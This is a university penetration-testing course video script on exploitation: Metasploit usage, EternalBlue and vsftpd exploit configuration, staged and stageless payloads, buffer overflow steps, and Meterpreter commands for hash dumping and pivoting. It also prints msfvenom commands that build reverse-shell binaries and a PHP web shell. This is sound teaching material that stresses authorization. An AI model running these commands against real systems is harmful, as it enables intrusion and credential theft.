# Video Script: Module 07 — Exploitation Techniques

## Course: CIS-4333 Penetration Testing

## Texas Wesleyan University | Professor Nash

## Estimated Duration: 20–24 minutes

## Certification Alignment: CompTIA PenTest+ (PT0-002)

---

### SLIDE 1 — Introduction (0:00–1:00)

Welcome to Module 07: Exploitation Techniques. I am Professor Nash. This is the module students anticipate most — and also the one that comes with the most important ethical responsibilities.

Everything in this module requires explicit written authorization. Exploitation means actively attempting to gain unauthorized access to a system. In a professional engagement, you are authorized to do this — and you document every action. Outside of authorized engagements, exploitation against real systems is a federal crime.

We will learn the Metasploit Framework, manual exploitation concepts, CVE exploitation, buffer overflow fundamentals, and the difference between staged and stageless payloads. All practice occurs in our isolated lab environment using Metasploitable 2 and HackTheBox machines.

---

### SLIDE 2 — The Exploitation Phase in Context (1:00–2:30)

Exploitation follows directly from the scanning and enumeration phase. You have a service map. You have software versions. You have known CVEs. Now you determine which of those vulnerabilities is actually exploitable in the target environment.

The professional exploitation workflow:

1. Research the vulnerability — understand what it does and its prerequisites
2. Identify an exploit — Metasploit module, public proof-of-concept, or manual technique
3. Configure the exploit — set target, payload, and options
4. Execute in a controlled manner — document every action and timestamp
5. Confirm access — verify the exploit succeeded and what access level was gained
6. Document and pause — record the finding before proceeding

Never exploit a system just because you can. Exploitation should be purposeful — demonstrating risk to inform the client's remediation decisions.

---

### SLIDE 3 — Metasploit Framework Overview (2:30–4:30)

Metasploit is the most widely used exploitation framework in the world. It is open-source, maintained by Rapid7, and ships with Kali Linux. The framework provides a structured environment for developing, testing, and executing exploits.

Metasploit components:

- **msfconsole** — the primary interactive interface
- **Modules** — organized exploits, payloads, auxiliaries, post-exploitation tools
- **Payloads** — code that runs on the target after successful exploitation
- **Sessions** — active connections to compromised systems
- **msfdb** — PostgreSQL database for storing scan and session data

Starting Metasploit:

```bash
sudo msfdb init
msfconsole
```

Basic navigation:

```text
msf6 > help
msf6 > search ms17-010
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(ms17_010_eternalblue) > info
msf6 exploit(ms17_010_eternalblue) > show options
msf6 exploit(ms17_010_eternalblue) > show payloads
```

---

### SLIDE 4 — Metasploit Module Types (4:30–6:00)

Metasploit organizes its capabilities into module types:

| Module Type | Purpose | Example |
|-------------|---------|---------|
| `exploit` | Delivers payload by exploiting a vulnerability | `ms17_010_eternalblue` |
| `auxiliary` | Scanning, brute force, fuzzing — no payload | `scanner/smb/smb_ms17_010` |
| `payload` | Code executed on target after exploitation | `windows/x64/meterpreter/reverse_tcp` |
| `post` | Post-exploitation: pivot, escalate, persist | `post/multi/recon/local_exploit_suggester` |
| `encoder` | Obfuscates payloads to evade detection | `x86/shikata_ga_nai` |
| `nop` | Generates NOP sleds for buffer overflows | `x86/opty2` |
| `evasion` | Advanced AV/EDR bypass techniques | Various |

The module path convention: `type/platform/category/module_name`

For example: `exploit/windows/smb/ms17_010_eternalblue` is an exploit module targeting Windows via SMB in the Microsoft category.

---

### SLIDE 5 — Configuring and Running an Exploit (6:00–8:00)

Once a module is selected, you configure required options and run:

```text
msf6 > use exploit/windows/smb/ms17_010_eternalblue

msf6 exploit(ms17_010_eternalblue) > set RHOSTS 192.168.1.50
msf6 exploit(ms17_010_eternalblue) > set LHOST 192.168.1.10
msf6 exploit(ms17_010_eternalblue) > set LPORT 4444

msf6 exploit(ms17_010_eternalblue) > show payloads
msf6 exploit(ms17_010_eternalblue) > set PAYLOAD windows/x64/meterpreter/reverse_tcp

msf6 exploit(ms17_010_eternalblue) > check
msf6 exploit(ms17_010_eternalblue) > run
```

Common option definitions:

| Option | Meaning |
|--------|---------|
| `RHOSTS` | Target IP address(es) |
| `RPORT` | Target port |
| `LHOST` | Attacker IP (for reverse connections) |
| `LPORT` | Attacker listening port |
| `PAYLOAD` | The payload to deliver |
| `THREADS` | Parallelism for auxiliary modules |

The `check` command tests whether the target is vulnerable without exploiting it — useful for verification and documentation.

---

### SLIDE 6 — Payloads: Staged vs. Stageless (8:00–10:00)

Payloads are the code that executes on the target after exploitation. Understanding the two payload architectures is critical for PenTest+.

### Staged Payloads

Staged payloads have two components:

- **Stage 0 (stager)** — a small initial payload that connects back to the attacker and downloads the full payload
- **Stage 1 (stage)** — the full Meterpreter or shell payload delivered over the established connection

Notation: `windows/x64/meterpreter/reverse_tcp` — the `/` between meterpreter and reverse_tcp indicates a staged payload.

Advantages: smaller initial payload size, bypasses some size restrictions. Disadvantages: requires network communication for the second stage; additional traffic generated.

### Stageless Payloads

Stageless payloads contain the complete payload in a single binary. No second stage download.

Notation: `windows/x64/meterpreter_reverse_tcp` — the `_` instead of `/` indicates stageless.

Advantages: self-contained, works in environments where callback traffic might be blocked. Disadvantages: larger file size, more easily detected by size-based detection.

On the PenTest+ exam: the `/` in the payload name indicates staged; the `_` indicates stageless.

---

### SLIDE 7 — Meterpreter (10:00–12:00)

Meterpreter is Metasploit's advanced payload that runs entirely in memory on the target — no disk writes, which reduces forensic evidence and evades some AV products.

After successful exploitation with a Meterpreter payload, you receive a Meterpreter session:

```text
meterpreter > help
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps
meterpreter > shell

# File operations
meterpreter > pwd
meterpreter > ls
meterpreter > upload /path/to/local/file
meterpreter > download C:\\Windows\\System32\\SAM

# Pivoting
meterpreter > run autoroute -s 10.10.10.0/24
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.20

# Post exploitation modules
meterpreter > run post/windows/gather/hashdump
meterpreter > run post/multi/recon/local_exploit_suggester
meterpreter > background
```

Meterpreter extensions add capabilities: `load kiwi` enables Mimikatz-style credential operations directly within Meterpreter.

---

### SLIDE 8 — Manual Exploitation Concepts (12:00–13:30)

Professional penetration testers do not rely exclusively on Metasploit. Manual exploitation demonstrates deeper understanding and works when Metasploit modules are unavailable or unreliable.

### Finding Exploits Manually

```bash
# Search Exploit-DB by CVE or software name
searchsploit vsftpd 2.3.4
searchsploit -m 49757    # Copy exploit to current directory

# Online databases
# https://www.exploit-db.com
# https://nvd.nist.gov
# https://packetstormsecurity.com
```

### Using a Python PoC Exploit

Many public exploits are Python scripts. The workflow:

```bash
# Read and understand the exploit before running it
cat exploit.py

# Modify target IP and port as needed
# Run against authorized target
python3 exploit.py TARGET_IP PORT
```

Always read exploit code before executing it. Public PoC scripts sometimes contain malicious additions. Understanding what the exploit does is part of professional practice.

---

### SLIDE 9 — CVE Exploitation Workflow (13:30–15:00)

A CVE (Common Vulnerabilities and Exposures) is a standardized identifier for known vulnerabilities. The exploitation workflow from CVE to access:

1. Identify the software version from scanning phase
2. Search the CVE database: `searchsploit`, NVD, or Exploit-DB
3. Review the CVE detail: Attack Vector, CVSS score, prerequisites
4. Find or develop an exploit (Metasploit module or public PoC)
5. Set up a test environment first if possible — never run unknown exploits only against production targets
6. Execute against the authorized target
7. Document the result: success, failure, exception encountered

Example — vsftpd 2.3.4 backdoor:

```bash
msf6 > search vsftpd
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(vsftpd_234_backdoor) > set RHOSTS 192.168.1.50
msf6 exploit(vsftpd_234_backdoor) > run
```

This exploit triggers a hardcoded backdoor in vsftpd 2.3.4 that opens a bind shell on port 6200.

---

### SLIDE 10 — Buffer Overflow Concepts (15:00–17:30)

Buffer overflow vulnerabilities occur when a program writes more data to a fixed-size buffer than it can hold, overwriting adjacent memory. This is one of the oldest and most impactful vulnerability classes.

### Stack Buffer Overflow Mechanics

The stack stores function call data: local variables, saved return addresses, and saved base pointers. A simplified stack frame:

```text
[Local Variable Buffer] [Saved EBP] [Saved Return Address] [Function Arguments]
```

If a program copies user input into the local variable buffer without length checking, an attacker can supply input that:

1. Fills the buffer (padding)
2. Overwrites the saved base pointer (EBP)
3. Overwrites the saved return address (EIP/RIP) with an attacker-controlled address
4. Points the return address at shellcode or a gadget chain

The key registers:

- **EIP (x86) / RIP (x64)** — Instruction Pointer: controls execution flow. Overwriting this controls where the CPU executes next.
- **ESP** — Stack Pointer: points to the top of the stack.
- **EBP** — Base Pointer: frame pointer for the current function.

### The Classic Buffer Overflow Steps

1. Fuzz the application to find the crash point (input length where the crash occurs)
2. Find the offset — the exact number of bytes to reach EIP using a unique pattern (Metasploit's `pattern_create` and `pattern_offset`)
3. Control EIP — confirm you can set EIP to any value
4. Find a JMP ESP or equivalent gadget in the program's memory
5. Generate shellcode — `msfvenom` for Meterpreter shellcode or system command
6. Build and deliver the exploit

---

### SLIDE 11 — msfvenom for Payload Generation (17:30–19:00)

msfvenom is the standalone Metasploit payload generator and encoder. It creates custom payloads for manual exploitation scenarios.

```bash
# Windows reverse shell executable
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell ELF binary
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

# PHP reverse shell (web shell)
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.php

# Python reverse shell
msfvenom -p python/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f raw -o shell.py

# List available formats
msfvenom --list formats

# List available payloads
msfvenom --list payloads | grep windows
```

After generating a payload, set up the corresponding listener in Metasploit:

```text
msf6 > use exploit/multi/handler
msf6 exploit(handler) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 exploit(handler) > set LHOST 192.168.1.10
msf6 exploit(handler) > set LPORT 4444
msf6 exploit(handler) > run
```

---

### SLIDE 12 — Managing Sessions (19:00–20:30)

After successful exploitation, Metasploit creates a session. Session management is critical for organized exploitation.

```text
# List active sessions
msf6 > sessions -l

# Interact with session 1
msf6 > sessions -i 1

# Background current session (from Meterpreter)
meterpreter > background

# Kill a session
msf6 > sessions -k 1

# Upgrade shell to Meterpreter
msf6 > sessions -u 1
```

Multiple simultaneous sessions can be maintained — useful when pivoting through an internal network. Each session should be documented with: target IP, port, exploit used, payload, and timestamp of exploitation.

---

### SLIDE 13 — PenTest+ Exam Alignment (20:30–21:30)

For PT0-002, focus on these key points from Module 07:

Metasploit module types: exploit, auxiliary, payload, post, encoder, nop. Know what each does.

Payload naming convention: `/` = staged, `_` = stageless. `meterpreter/reverse_tcp` is staged; `meterpreter_reverse_tcp` is stageless.

Meterpreter runs in memory — no disk writes. This is why it is preferred for stealth.

Buffer overflow components: understand EIP control, pattern_create/pattern_offset workflow, and shellcode delivery.

msfvenom generates standalone payloads — know the `-p`, `-f`, `-o`, `LHOST`, `LPORT` flags.

CVE exploitation follows a research-understand-configure-execute-document workflow.

The `check` command in Metasploit verifies vulnerability without exploiting — useful for documentation.

---

### SLIDE 14 — Closing and Lab Preview (21:30–22:30)

Module 07 covered the exploitation phase — translating discovered vulnerabilities into demonstrated access. Key takeaways:

- Metasploit provides a structured framework for exploitation
- Staged payloads use two-stage delivery; stageless are self-contained
- Meterpreter is an in-memory, feature-rich payload
- Buffer overflows work by overwriting the return address to redirect execution
- msfvenom generates custom payloads for manual exploitation
- Document every exploitation action with timestamp and result

In the lab, you will exploit vsftpd 2.3.4 and Samba vulnerabilities on Metasploitable 2 using Metasploit modules and establish Meterpreter sessions.

In Module 08, we take those sessions further with privilege escalation, credential dumping, and lateral movement.

---

### End of Module 07 Video Script

**Proprietary and Confidential. Not for disclosure outside of Texas Wesleyan University course use.**
